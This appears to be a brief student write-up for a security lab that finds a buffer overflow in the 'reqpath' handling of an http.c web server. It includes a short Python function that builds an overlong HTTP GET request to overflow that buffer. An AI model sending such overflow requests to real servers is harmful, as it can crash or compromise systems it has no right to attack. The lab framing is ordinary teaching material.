# Lab 1

## Part 1: Finding buffer overflows

There is one buffer overflow we can find in the `http.c`, the `reqpath`
can be overflowed.

So I write a brute-force python script:

```py
def build_exploit(shellcode):
    junk_data = b"22"
    req = b"GET " + b"/1" + junk_data * 2060 + b" HTTP/1.0\r\n\r\n"
    return req
```

